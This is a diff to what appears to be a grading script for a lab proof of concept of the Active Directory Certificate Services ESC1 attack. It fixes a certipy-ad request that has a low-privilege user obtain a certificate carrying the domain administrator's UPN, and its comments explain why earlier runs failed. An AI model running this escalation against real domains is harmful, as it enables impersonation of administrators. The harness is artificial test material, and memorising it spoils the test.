@@ -18,6 +18,7 @@ set -uo pipefail
 
 CERTIPY=/usr/bin/certipy-ad
 DC_IP=10.20.30.5
+CA_HOST='corp-ca01.corp.local'
 CA_NAME='corp-ca01-CA'
 TEMPLATE='ESC1-SmartCard'
 
@@ -34,12 +35,28 @@ fi
 
 cd "$(mktemp -d)" || { echo "[verify-poc-07] HARNESS ERROR: mktemp failed" >&2; exit 2; }
 
+# -target is REQUIRED and was missing. Without it certipy sends the RPC
+# enrollment request to -dc-ip, i.e. the DOMAIN CONTROLLER, which does not run
+# CertSvc -- so its endpoint mapper has no ICertRequestD and every run died with
+#   ept_s_not_registered for 91AE6020-9E3C-11CF-8D7C-00AA00C091BE
+# on gates 1 AND 2 alike. -dc-ip is for LDAP/Kerberos; the CA host is separate.
+#
+# This looked for a long time like a CertSvc registration fault on the CA. It
+# was not: rpcdump against corp-ca01 lists the interface bound on
+# ncacn_ip_tcp:10.20.30.6[49712], and adding -target immediately produced
+# "[*] Request ID is 9" -- the CA accepting and processing the request. The
+# requests had simply been going to the wrong machine.
+#
+# stdin is redirected from /dev/null because certipy prompts
+# "Would you like to save the private key? (y/N)" on some errors, and a grader
+# must never block on input.
 REQ=$(timeout 60 "$CERTIPY" req \
     -u 'alice@corp.local' -p 'Password1!' \
     -ca "$CA_NAME" \
+    -target "$CA_HOST" \
     -dc-ip "$DC_IP" \
     -template "$TEMPLATE" \
-    -upn 'administrator@corp.local' 2>&1)
+    -upn 'administrator@corp.local' 2>&1 </dev/null)
 REQ_RC=$?
 
 echo "--- certipy req output (rc=$REQ_RC) ---"
